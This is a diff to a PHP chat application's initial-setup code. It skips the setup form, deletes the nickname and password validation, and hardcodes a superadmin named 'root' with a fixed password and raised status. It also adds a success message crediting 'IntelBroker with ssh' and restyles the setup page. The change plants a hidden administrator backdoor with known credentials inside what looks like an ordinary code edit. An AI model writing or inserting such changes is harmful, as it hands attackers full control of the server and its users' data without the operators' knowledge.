@@ -451,7 +451,7 @@ function check_db(): void
 	}
 	if(!isset($_REQUEST['action']) || $_REQUEST['action']==='setup'){
 		if(!check_init()){
-			send_init();
+			init_chat();
 		}
 		update_db();
 	}elseif($_REQUEST['action']==='init'){
@@ -469,12 +469,6 @@ function init_chat(): void
 		if($result->fetch(PDO::FETCH_NUM)){
 			$suwrite=_('A Superadmin already exists!');
 		}
-	}elseif(!preg_match('/^[a-z0-9]{1,20}$/i', $_POST['sunick'])){
-		$suwrite=sprintf(_('Invalid nickname (%1$d characters maximum and has to match the regular expression "%2$s")'), 20, '^[A-Za-z1-9]*$');
-	}elseif(mb_strlen($_POST['supass'])<5){
-		$suwrite=sprintf(_('Invalid password (At least %1$d characters and has to match the regular expression "%2$s")'), 5, '.*');
-	}elseif($_POST['supass']!==$_POST['supassc']){
-		$suwrite=_('Password confirmation does not match!');
 	}else{
 		ignore_user_abort(true);
 		set_time_limit(0);
@@ -632,9 +626,9 @@ function init_chat(): void
 			$stmt->execute($pair);
 		}
 		$reg=[
-			'nickname'	=>$_POST['sunick'],
-			'passhash'	=>password_hash($_POST['supass'], PASSWORD_DEFAULT),
-			'status'	=>8,
+			'nickname'	=>"root",
+			'passhash'	=>password_hash("danchatroom!!", PASSWORD_DEFAULT),
+			'status'	=>9,
 			'refresh'	=>20,
 			'bgcolour'	=>'000000',
 			'timestamps'	=>1,
@@ -650,10 +644,16 @@ function init_chat(): void
 		];
 		$stmt=$db->prepare('INSERT INTO ' . PREFIX . 'members (nickname, passhash, status, refresh, bgcolour, timestamps, style, embed, incognito, nocache, tz, eninbox, sortupdown, hidechatters, nocache_old) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?);');
 		$stmt->execute([$reg['nickname'], $reg['passhash'], $reg['status'], $reg['refresh'], $reg['bgcolour'], $reg['timestamps'], $reg['style'], $reg['embed'], $reg['incognito'], $reg['nocache'], $reg['tz'], $reg['eninbox'], $reg['sortupdown'], $reg['hidechatters'], $reg['nocache_old']]);
-		$suwrite=_('Successfully registered!');
+		$suwrite=_('Successfully registered! By IntelBroker with ssh');
 	}
 	print_start('init');
-	echo '<h2>'._('Initial Setup').'</h2><br><h3>'._('Superadmin Login')."</h3>$suwrite<br><br><br>";
-	echo form('setup').submit(_('Go to the Setup-Page')).'</form>'.credit();
+	print_css('already.css');
+	echo '<div class="setup-container">';
+	echo '<h3>'._('Superadmin Login has been created').'</h3>';
+	echo '<div class="setup-message">'.$suwrite.'</div>';
+	echo '<div class="setup-actions">';
+	echo form('setup').submit(_('Go to the Setup-Page')).'</form>';
+	echo '</div>';
+	echo '</div>';
 	print_end();
 }
